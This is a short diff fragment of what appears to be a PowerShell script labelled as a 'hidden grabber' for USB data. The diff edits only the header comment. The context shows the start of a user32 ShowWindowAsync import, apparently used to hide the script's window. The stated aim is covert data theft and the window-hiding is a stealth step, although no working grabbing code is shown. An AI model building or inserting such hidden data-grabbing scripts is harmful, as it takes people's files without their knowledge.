@@ -1,4 +1,4 @@
-# hidden grabber USB
+# Hidden grabber USB data
 
 $Signature = @"
 [DllImport("user32.dll")]public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);
